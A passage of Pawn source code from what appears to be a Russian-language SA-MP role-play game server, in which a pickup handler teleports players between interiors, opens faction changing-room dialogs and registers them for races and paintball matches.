			else ShowPlayerDialogEx(playerid,1011,DIALOG_STYLE_LIST, "Раздевалка", "Завершить рабочий день\nСменить одежду", "Далее", "Отмена");
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вы не работаете в данной организации");
		}
	}
	else if(pickupid == FormaFracPic[7])
	{
		if(PlayerInfo[playerid][pMember] == 11)
		{
			if(!GetPVarInt(playerid,"Fraction_Duty")) ShowPlayerDialogEx(playerid,1010,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день?", "Да", "Нет");
			else ShowPlayerDialogEx(playerid,1011,DIALOG_STYLE_LIST, "Раздевалка", "Завершить рабочий день\nСменить одежду", "Далее", "Отмена");
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вы не работаете в данной организации");
		}
	}
	else if(pickupid == FormaFracPic[8])
	{
		if(PlayerInfo[playerid][pMember] == 16)
		{
			if(!GetPVarInt(playerid,"Fraction_Duty")) ShowPlayerDialogEx(playerid,1010,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день?", "Да", "Нет");
			else ShowPlayerDialogEx(playerid,1011,DIALOG_STYLE_LIST, "Раздевалка", "Завершить рабочий день\nСменить одежду", "Далее", "Отмена");
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вы не работаете в данной организации");
		}
	}
	else if(pickupid == FormaFracPic[9])
	{
		if(PlayerInfo[playerid][pMember] == 19)
		{
			if(!GetPVarInt(playerid,"Fraction_Duty")) ShowPlayerDialogEx(playerid,1010,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день?", "Да", "Нет");
			else ShowPlayerDialogEx(playerid,1011,DIALOG_STYLE_LIST, "Раздевалка", "Завершить рабочий день\nСменить одежду", "Далее", "Отмена");
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вы не работаете в данной организации");
		}
	}
	else if(pickupid == FormaFracPic[10])
	{
		if(PlayerInfo[playerid][pMember] == 20)
		{
			if(!GetPVarInt(playerid,"Fraction_Duty")) ShowPlayerDialogEx(playerid,1010,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день?", "Да", "Нет");
			else ShowPlayerDialogEx(playerid,1011,DIALOG_STYLE_LIST, "Раздевалка", "Завершить рабочий день\nСменить одежду", "Далее", "Отмена");
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вы не работаете в данной организации");
		}
	}
	else if(pickupid == FormaFracPic[11])
	{
		if(PlayerInfo[playerid][pMember] == 21)
		{
			if(!GetPVarInt(playerid,"Fraction_Duty")) ShowPlayerDialogEx(playerid,1010,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день?", "Да", "Нет");
			else ShowPlayerDialogEx(playerid,1011,DIALOG_STYLE_LIST, "Раздевалка", "Завершить рабочий день\nСменить одежду", "Далее", "Отмена");
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вы не работаете в данной организации");
		}
	}
	else if(pickupid == parashut)
	{
		GiveWeapon(playerid, 46, 1);
	}
	else if(pickupid == derbyrace[0])
	{
		return SCM(playerid,COLOR_GREY," Разработка");
	}
	else if(pickupid == derbyrace[1])
	{
		SetPlayerInterior(playerid,1);
		SetPlayerPos(playerid,-2170.4685,638.5978,1052.3750);
		SetPlayerFacingAngle(playerid,355.9632);
	}
	else if(pickupid == derbyrace[2])
	{
		//if(Playerderby[playerid] == 1) DerbyPlayers -= 1;
		TogglePlayerControllable(playerid, 1);
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,-2113.5208,-442.3560,38.2776);
		SetPlayerFacingAngle(playerid, 76.4112);
		//Playerderby[playerid] = 0;
	}
	else if(pickupid == sportzal[0])
	{
		if(PlayerInfo[playerid][pJob] == 6 && PlayerInfo[playerid][pMember] == 0)
		{
			SetPlayerSkin(playerid, 49);
		}
		SetPlayerInterior(playerid,5);
		SetPlayerPos(playerid,771.4412,-2.7885,1000.7279);
		SetPlayerFacingAngle(playerid, 21.2131);
	}
	else if(pickupid == sportzal[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,2097.5024,2489.8967,14.8390);
		SetPlayerFacingAngle(playerid, 180.8626);
		SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
		if(PlayerInfo[playerid][pMember] >= 1) { SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);}
		if(PlayerInfo[playerid][pMember] == 0) { SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);}
	}
	else if(pickupid >= carpick[0] && pickupid <= carpick[3]) CallLocalFunction("OnPlayerCommandText", "is", playerid, "/buycar");
	else if(pickupid == arace)
	{
		if(race_info[1] != 1) return SCM(playerid,COLOR_GREY," Регистрация закрыта");
		//if(PlayerInfo[playerid][pLevel] < 3)return SCM(playerid,COLOR_GRAD1,"Участвовать можно с 3-х лет проживания в штате!");
		if(PlayerInfo[playerid][pWarns]) return SCM(playerid,COLOR_GREY, " Нельзя учавствовать с Варном");
		if(GetPVarInt(playerid, "gonka")) return SCM(playerid, COLOR_GREY, " Вы уже зарегистрировались на матч!");
		new null;
		foreach(i) if(GetPVarInt(i,"gonka")) null++;
		if(null > 12) return SCM(playerid,COLOR_GREY, " Слишком много участников");
		SetPVarInt(playerid, "gonka", 1);
		SCM(playerid,0x6495EDFF,"Вы успешно зарегистрированы на гонку. Не выходите из помещения!");
		format(YCMDstr, sizeof(YCMDstr), " Зарегистрирован участник под номером: %i",null+1);
		if(GetPVarInt(playerid,"gonka")) ProxDetector(30.0, playerid, YCMDstr, 0x6495EDFF,0x6495EDFF,0x6495EDFF,0x6495EDFF,0x6495EDFF);
		return true;
	}
	else if(pickupid == racee[0])
	{
		SetPlayerInterior(playerid,3);
		SetPlayerPos(playerid,831.7769,6.8750,1004.1797);
		SetPlayerFacingAngle(playerid,108.1610);
	}
	else if(pickupid == racee[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,1958.6117,-2183.5022,13.5469);
		SetPlayerFacingAngle(playerid,271.8013);
		SetPlayerVirtualWorld(playerid,0);
		DeletePVar(playerid,"gonka");
	}
	else if(pickupid == lspic[0])
	{
        LoadInterior(playerid);
		SetPlayerPos(playerid,1650.9373,-1649.7738,99.5609);
		SetPlayerFacingAngle(playerid, 359.8156);
		SetPlayerVirtualWorld(playerid, 1);
		TogglePlayerControllable(playerid, 0);
	}
	else if(pickupid == lspic[1])
	{
		if(PEfir[playerid] != 255)
		{
			SCM(playerid, -1, " Вы вышли из прямого эфира");
			PEfir[playerid] = 255;
			if(PlayerInfo[playerid][pMember] == 9 && smssf == playerid)
			{
			    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
				format(string, 128, " [SFN] %s завершил приём звонков от слушателей", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
				smssf = -1;
			}
			else if(PlayerInfo[playerid][pMember] == 16 && smsls == playerid)
			{
			    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
				format(string, 128, " [LSN] %s завершил приём звонков от слушателей", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
				smsls = -1;
			}
			else if(PlayerInfo[playerid][pMember] == 20 && smslv == playerid)
			{
			    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
				format(string, 128, " [LVN] %s завершил приём звонков от слушателей", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
				smslv = -1;
			}
		}
		if(Pefir[playerid] == 1 || Pefir[playerid] == 2)
		{
			PEfir[playerid] = 255;
			SCM(playerid, -1, " Вы вышли из прямого эфира");
		}
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,1658.3607,-1694.8757,15.6094);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == lvpic[0])
	{
        LoadInterior(playerid);
		SetPlayerPos(playerid,2643.4954,1198.2725,40.5609);
		SetPlayerFacingAngle(playerid, 359.8156);
		SetPlayerVirtualWorld(playerid, 3);
		TogglePlayerControllable(playerid, 0);
	}
	else if(pickupid == lvpic[1])
	{
		if(PEfir[playerid] != 255)
		{
			SCM(playerid, -1, " Вы вышли из прямого эфира");
			PEfir[playerid] = 255;
			if(PlayerInfo[playerid][pMember] == 9 && smssf == playerid)
			{
			    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
				format(string, 128, " [SFN] %s завершил приём звонков от слушателей", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
				smssf = -1;
			}
			else if(PlayerInfo[playerid][pMember] == 16 && smsls == playerid)
			{
			    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
				format(string, 128, " [LSN] %s завершил приём звонков от слушателей", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
				smsls = -1;
			}
			else if(PlayerInfo[playerid][pMember] == 20 && smslv == playerid)
			{
			    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
				format(string, 128, " [LVN] %s завершил приём звонков от слушателей", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
				smslv = -1;
			}
		}
		if(Pefir[playerid] == 1 || Pefir[playerid] == 2)
		{
			PEfir[playerid] = 255;
			SCM(playerid, -1, " Вы вышли из прямого эфира");
		}
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,2649.1655,1183.9111,10.8203);
		SetPlayerFacingAngle(playerid, 180.0000);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == pdd)
	{
		GameTextForPlayer(playerid, "~r~/pdd", 1000, 1);
	}
	else if(pickupid == medicss[0]) // medic SF enter
	{
		SetPlayerInterior(playerid,15);
		SetPlayerPos(playerid,283.977203, 181.335388, 1214.794922);
		SetPlayerFacingAngle(playerid, 270);
		SetPlayerVirtualWorld(playerid, 3);
		TogglePlayerControllableEx(playerid, 0);
		LoadInterior(playerid);
		RobInts[playerid] = 5;
	}
	else if(pickupid == medicss[1]) // medic SF exit
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,-2664.4895,636.7567,14.4531);
		SetPlayerFacingAngle(playerid, 180.9984);
		SetPlayerVirtualWorld(playerid, 0);
		RobInts[playerid] = -1;
	}
	else if(pickupid == medicss[2]) // medic LS enter
	{
		SetPlayerInterior(playerid,15);
		SetPlayerPos(playerid,283.977203, 181.335388, 1214.794922);
		SetPlayerFacingAngle(playerid, 270);
		SetPlayerVirtualWorld(playerid, 4);
		TogglePlayerControllableEx(playerid, 0);
		LoadInterior(playerid);
		RobInts[playerid] = 6;
	}
	else if(pickupid == medicss[3]) // medic LS exit
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,1176.2983,-1323.4597,14.0144);
		SetPlayerFacingAngle(playerid, 270.0000);
		SetPlayerVirtualWorld(playerid, 0);
		RobInts[playerid] = -1;
	}
	else if(pickupid == medicss[4]) // medic LV enter
	{
		SetPlayerInterior(playerid,15);
		SetPlayerPos(playerid,283.977203, 181.335388, 1214.794922);
		SetPlayerFacingAngle(playerid, 270);
		SetPlayerVirtualWorld(playerid, 5);
		TogglePlayerControllableEx(playerid, 0);
		LoadInterior(playerid);
		RobInts[playerid] = 7;
	}
	if(pickupid == medicss[5]) // medic LV exit
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,1607.5677,1818.9572,10.8203);
		SetPlayerFacingAngle(playerid, 360.0000);
		SetPlayerVirtualWorld(playerid, 0);
		RobInts[playerid] = -1;
	}
	else if(pickupid == medicss[6]) // medic FC enter
	{
		SetPlayerInterior(playerid,15);
		SetPlayerPos(playerid,283.977203, 181.335388, 1214.794922);
		SetPlayerFacingAngle(playerid, 270);
		SetPlayerVirtualWorld(playerid, 6);
		TogglePlayerControllableEx(playerid, 0);
		LoadInterior(playerid);
		RobInts[playerid] = 8;
	}
	if(pickupid == medicss[7]) // medic FC exit
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,-318.9004,1051.0360,20.3403);
		SetPlayerFacingAngle(playerid, 345.8104);
		SetPlayerVirtualWorld(playerid, 0);
		RobInts[playerid] = -1;
	}
	else if(pickupid == medicss[8]) // medic CGH enter
	{
		SetPlayerInterior(playerid,15);
		SetPlayerPos(playerid,283.977203, 181.335388, 1214.794922);
		SetPlayerFacingAngle(playerid, 270);
		SetPlayerVirtualWorld(playerid, 7);
		TogglePlayerControllableEx(playerid, 0);
		LoadInterior(playerid);
		RobInts[playerid] = 9;
	}
	if(pickupid == medicss[9]) // medic CGH exit
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,2034.4718,-1404.8879,17.2479);
		SetPlayerFacingAngle(playerid, 180.0);
		SetPlayerVirtualWorld(playerid, 0);
		RobInts[playerid] = -1;
	}
	else if(pickupid == mast[0])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,1657.9347,2197.8618,10.8203);
		SetPlayerFacingAngle(playerid, 183.9151);
		SetPlayerVirtualWorld(playerid, 0);
		RemovePlayerAttachedObject(playerid,0);
	}
	else if(pickupid == mast[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,-1800.4135,1197.5573,25.1194);
		SetPlayerFacingAngle(playerid, 182.3717);
		SetPlayerVirtualWorld(playerid, 0);
		RemovePlayerAttachedObject(playerid,0);
	}
	else if(pickupid == mast[2])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,854.0541,-601.7619,18.4219);
		SetPlayerFacingAngle(playerid, 0.6835);
		SetPlayerVirtualWorld(playerid, 0);
		RemovePlayerAttachedObject(playerid,0);
	}
	else if(pickupid == addictionenter)
	{
		SetPlayerInterior(playerid,5);
		SetPlayerPos(playerid,318.2598,1118.8209,1083.8828);
		SetPlayerFacingAngle(playerid, 2.7967);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == sfpdpic[0])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,-2052.4917,458.5779,35.1719);
		SetPlayerFacingAngle(playerid, 312.1454);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == sfpdpic[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,-2047.0208,450.5458,139.7422);
		SetPlayerFacingAngle(playerid, 153.7635);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == sfpdpic[2])
	{
		if(PEfir[playerid] != 255)
		{
			SCM(playerid, -1, " Вы вышли из прямого эфира");
			PEfir[playerid] = 255;
			if(PlayerInfo[playerid][pMember] == 9 && smssf == playerid)
			{
			    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
				format(string, 128, " [SFN] %s завершил приём звонков от слушателей", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
				smssf = -1;
			}
			else if(PlayerInfo[playerid][pMember] == 16 && smsls == playerid)
			{
			    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
				format(string, 128, " [LSN] %s завершил приём звонков от слушателей", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
				smsls = -1;
			}
			else if(PlayerInfo[playerid][pMember] == 20 && smslv == playerid)
			{
			    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
				format(string, 128, " [LVN] %s завершил приём звонков от слушателей", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
				smslv = -1;
			}
		}
		if(Pefir[playerid] == 1 || Pefir[playerid] == 2)
		{
			PEfir[playerid] = 255;
			SCM(playerid, -1, " Вы вышли из прямого эфира");
		}
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,-2052.4917,458.5779,35.1719);
		SetPlayerFacingAngle(playerid, 312.1454);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == sfpdpic[3])
	{
        LoadInterior(playerid);
		SetPlayerPos(playerid,-2057.9453,445.6013,189.7110);
		SetPlayerFacingAngle(playerid, 359.8156);
		SetPlayerVirtualWorld(playerid, 2);
		TogglePlayerControllable(playerid, 0);
	}
	else if(pickupid == lcnpic[0])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,1451.8104,750.8665,11.0234);
		SetPlayerFacingAngle(playerid, 89.1102);
		SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == lcnpic[1])
	{
		SetPlayerInterior(playerid, 5);
		SetPlayerPos(playerid,1298.6915,-794.2542,1084.0078);
		SetPlayerFacingAngle(playerid, 349.0933);
		SetPlayerVirtualWorld(playerid, 2);
	}
	else if(pickupid == lcnpic[2])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,1533.6487,751.3372,11.0234);
		SetPlayerFacingAngle(playerid, 89.1102);
		SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == lcnpic[3])
	{
		SetPlayerInterior(playerid, 5);
		SetPlayerPos(playerid,1263.3304,-785.4093,1091.9063);
		SetPlayerFacingAngle(playerid, 349.0933);
		SetPlayerVirtualWorld(playerid, 2);
	}
	else if(pickupid == zip[0])
	{
		SetPlayerInterior(playerid,5);
		SetPlayerPos(playerid,225.2378,-8.0487,1002.2109);
		SetPlayerFacingAngle(playerid, 89.5070);
		SetPlayerVirtualWorld(playerid,1);
		zips[playerid] = true;
		RobInts[playerid] = 3;
	}
	else if(pickupid == zip[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,-1696.8130,948.5907,24.8906);
		SetPlayerFacingAngle(playerid, 137.1418);
		SetPlayerVirtualWorld(playerid,0);
		zips[playerid] = false;
		RobInts[playerid] = -1;
	}
	else if(pickupid == victim2[0])
	{
		SetPlayerInterior(playerid,5);
		SetPlayerPos(playerid,225.2378,-8.0487,1002.2109);
		SetPlayerFacingAngle(playerid, 89.5070);
		SetPlayerVirtualWorld(playerid,2);
		RobInts[playerid] = 4;
	}
	else if(pickupid == victim2[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,458.0936,-1501.5496,31.0372);
		SetPlayerFacingAngle(playerid, 101.4322);
		SetPlayerVirtualWorld(playerid,0);
		RobInts[playerid] = -1;
	}
	else if(pickupid == addictionexit)
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,2168.0977,-1673.5548,15.0826);
		SetPlayerFacingAngle(playerid,217.7220);
		SetPlayerVirtualWorld(playerid,0);
	}
	else if(pickupid == rmpic[1])
	{
		SetPlayerInterior(playerid, 5);
		SetPlayerPos(playerid,1286.2816,-836.2054,1085);
		SetPlayerFacingAngle(playerid, 3.7600);
		SetPlayerVirtualWorld(playerid, 1);
	}
	else if(pickupid == rmpic[0])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,963.4916,1684.2570,8.8516);
		SetPlayerFacingAngle(playerid, 270.5075);
		SetPlayerVirtualWorld(playerid,0);
	}
	else if(pickupid == rmpic2[1])
	{
		SetPlayerInterior(playerid, 5);
		SetPlayerPos(playerid,1263.1458,-785.5604,1091.9063);
		SetPlayerFacingAngle(playerid, 349.0933);
		SetPlayerVirtualWorld(playerid, 1);
	}
	else if(pickupid == rmpic2[0])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,964.5447,1782.8569,8.8581);
		SetPlayerFacingAngle(playerid, 276.0833);
		SetPlayerVirtualWorld(playerid,0);
	}
	else if(pickupid == rmpick[1])
	{
		SetPlayerInterior(playerid, 5);
		SetPlayerPos(playerid,1298.9998,-794.4816,1084.0078);
		SetPlayerFacingAngle(playerid, 346.4799);
		SetPlayerVirtualWorld(playerid, 1);
	}
	else if(pickupid == rmpick[0])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,940.2573,1733.2078,8.8516);
		SetPlayerFacingAngle(playerid, 268.7956);
		SetPlayerVirtualWorld(playerid,0);
	}
	else if(pickupid == yakexit[1])
	{
		SetPlayerInterior(playerid, 5);
		SetPlayerPos(playerid,1298.6915,-794.2542,1084.0078);
		SetPlayerFacingAngle(playerid, 349.0933);
	}
	else if(pickupid == yakexit[0])
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,1457.5305,2773.4219,10.8203);
		SetPlayerFacingAngle(playerid, 276.0466);
	}
	else if(pickupid == fbi[5])
	{
		SetPlayerInterior(playerid,3);
		SetPlayerVirtualWorld(playerid, 130);
		SetPlayerPos(playerid,-2477.3394,534.8168,1039.1460);
		SetPlayerFacingAngle(playerid, 180.000);
	}
	else if(pickupid == fbi[4])
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,-2443.0530,497.7977,492.1183);
		SetPlayerFacingAngle(playerid, 359.8720);
	}
	else if(pickupid == fbi[3])
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,-2456.9695,518.1188,492.1730);
		SetPlayerFacingAngle(playerid, 176.8417);
	}
	else if(pickupid == fbi[2])
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,-2452.6711,513.1982,45.5625);
		SetPlayerFacingAngle(playerid, 264.6982);
	}
	/*if(pickupid == rmspawn[0]) // Vhod RM
	{
		SetPlayerPos(playerid, 1286.6494,-837.5760,1085.6328);
		SetPlayerVirtualWorld(playerid,1);
		SetPlayerInterior(playerid, 5);
		SetPlayerFacingAngle(playerid, 356.8563);
	}*/
	if(pickupid == rmspawn[1]) // Vyhod RM
	{
		SetPlayerPos(playerid, 962.8901,1684.3445,8.8516);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 88.6402);
	}
	else if(pickupid == lift)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,1161.3190,-1327.4117,31.4998);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(pickupid == kauta)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,-1328.9766,495.3914,27.8631);
		SetPlayerVirtualWorld(playerid, 5);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(pickupid == kauta2)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,-1348.2666,494.8684,18.2278);
		SetPlayerFacingAngle(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == wmcvhod)
	{
		SetPlayerInterior(playerid, 11);
		SetPlayerVirtualWorld(playerid, 998);
		SetPlayerPos(playerid, 502.0615,-70.1586,998.7578);
		SetPlayerFacingAngle(playerid,178.1080);
	}
	else if(pickupid == vmcvhod)
	{
		SetPlayerInterior(playerid, 11);
		SetPlayerVirtualWorld(playerid, 52);
		SetPlayerPos(playerid, 502.0615,-70.1586,998.7578);
		SetPlayerFacingAngle(playerid,178.1080);
	}
	else if(pickupid == vmcvqhod)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid, 681.5864,-478.4098,16.3359);
		SetPlayerFacingAngle(playerid,179.4115);
	}
	/*if(pickupid == rmspawn[0]) // Vhod LCN
	{
		SetPlayerPos(playerid, 1263.6709,-785.2509,1091.9063);
		SetPlayerVirtualWorld(playerid,1);
		SetPlayerInterior(playerid, 5);
		SetPlayerFacingAngle(playerid, 356.8563);
	}*/
	if(pickupid == rmspawn[1]) // Vyhod LCN
	{
		SetPlayerPos(playerid, 1532.5365,751.3397,11.0234);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 88.6402);
	}
	else if(pickupid == wmcvqhod)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid, 661.4137,1718.1427,7.1875);
		SetPlayerFacingAngle(playerid,39.7059);
	}
	else if(pickupid == pmcvhod)
	{
		SetPlayerInterior(playerid, 11);
		SetPlayerVirtualWorld(playerid, 8);
		SetPlayerPos(playerid, 502.0615,-70.1586,998.7578);
		SetPlayerFacingAngle(playerid,178.1080);
	}
	else if(pickupid == pmcvqhod)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid, -2103.5435,-2482.9031,30.6250);
		SetPlayerFacingAngle(playerid,93.5094);
	}
	else if(pickupid == paints[0])
	{
		if(paint_info[1] != 1) return SCM(playerid,COLOR_GREY," Регистрация закрыта");
		//if(PlayerInfo[playerid][pLevel] < 3)return SCM(playerid,COLOR_GRAD1,"Участвовать можно с 3-х лет проживания в штате!");
		if(PlayerInfo[playerid][pWarns]) return SCM(playerid,COLOR_GREY, " Нельзя учавствовать с Варном");
		if(GetPVarInt(playerid, "player_paint")) return SCM(playerid, COLOR_GREY, " Вы уже зарегистрировались на матч!");
		new null;
		foreach(i) if(GetPVarInt(i,"player_paint")) null++;
		if(null >= 20) return SCM(playerid,COLOR_GREY, " Слишком много участников");
		SetPVarInt(playerid, "player_paint", 1);
		SCM(playerid,0x6495EDFF," Вы успешно зарегистрированы на матч. Не выходите из помещения!");
		format(string, 144, " Зарегистрирован участник под номером: %i", null+1);
		foreach(i) if(GetPVarInt(i,"player_paint")) SCM(i,0x6495EDFF, string);
		return true;
	}
	else if(pickupid == paints[1])
	{
		SetPlayerInterior(playerid, 1);
		SetPlayerPos(playerid, 286.4868, -40.2647, 1001.5156);
		SetPlayerFacingAngle(playerid, 318.7845);
		SetPlayerVirtualWorld(playerid, 1);
	}
	else if(pickupid == paints[2])
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid, 2593.7839,2790.6182,10.8203);
		SetPlayerFacingAngle(playerid, 92.0974);
		SetPlayerVirtualWorld(playerid, 0);
		CP[playerid] = 0;
		DeletePVar(playerid,"player_paint");
		return true;
	}
	else if(pickupid >= paintguns[0] && pickupid <= paintguns[3])
	{
		if(GetPVarInt(playerid,"player_paint") != 2) return true;
		if(pickupid == paintguns[0]) GiveWeapon(playerid, 25, 30);
		else if(pickupid == paintguns[1]) GiveWeapon(playerid, 24, 30);
		else GiveWeapon(playerid, 31, 90);
	}
	else if(pickupid == lift2)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,1147.1436,-1315.2219,13.6735);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(pickupid == lift3)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,-2713.6965,629.1685,34.4028);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(pickupid == lift4)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,-2705.8311,637.6959,14.4545);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(pickupid == cerkva)
	{
		SetPlayerInterior(playerid, 1);
		SetPlayerPos(playerid,-1940.1830,1118.6595,1332.6483);
		SetPlayerVirtualWorld(playerid, 1);
	}
	else if(pickupid == cerkva2)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,-1985.9872,1118.4680,53.6462);
		SetPlayerFacingAngle(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == lift5)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,1607.3185,1788.1012,30.4688);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(pickupid == lift6)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,1599.6445,1817.1877,10.8203);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(pickupid == ash)
	{
		LoadInterior(playerid);
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,2355.8733,1656.7927,3040.7622);
		SetPlayerVirtualWorld(playerid, 7);
		SetPlayerFacingAngle(playerid, 44.2167);
	}
	else if(pickupid == ash2)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,-2028.8140,-99.3851,35.4915);
		SetPlayerFacingAngle(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerFacingAngle(playerid, 358.5047);
	}
	else if(pickupid == fbi[1])
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,-2453.7595,503.7701,30.0798);
		SetPlayerFacingAngle(playerid, 272.4807);
		SetPVarInt(playerid, "inUchastok", 0);
	}
	else if(pickupid == fbi[0])
	{
		if(IsAArm(playerid)|| IsACop(playerid) || IsAMayor(playerid)|| PlayerInfo[playerid][pPKeys] == 1)
		{
			SetPlayerInterior(playerid,3);
			SetPlayerVirtualWorld(playerid, 130);
			SetPlayerPos(playerid,-2459.2603,516.7242,1039.1460);
			SetPlayerFacingAngle(playerid, 90.0);
		}
		else
		{
			SCM(playerid, 0x9f0000aa, " У вас нет пропуска. Дверь заперта");
		}
	}
	else if(pickupid == lspd[0])
	{
		LoadInterior(playerid);
		SetPlayerVirtualWorld(playerid,4);
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,1210.0264,1334.2427,3011.0005);
		SetPlayerFacingAngle(playerid, 2.2298);
		SetPVarInt(playerid, "inUchastok", 1);
	}
	else if(pickupid == lspd[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,1552.8159,-1675.4498,16.1953);
		SetPlayerFacingAngle(playerid, 91.8310);
		SetPlayerVirtualWorld(playerid, 0);
		SetPVarInt(playerid, "inUchastok", 0);
	}
	else if(pickupid == lspd[2])
	{
		ShowPlayerDialogEx(playerid, 1014, DIALOG_STYLE_LIST, "Лифт", "{FFFFFF}Крыша\nЭтаж 2\nЭтаж 1\nГараж", "Далее", "Выйти");
	}
	else if(pickupid == lspd[3])
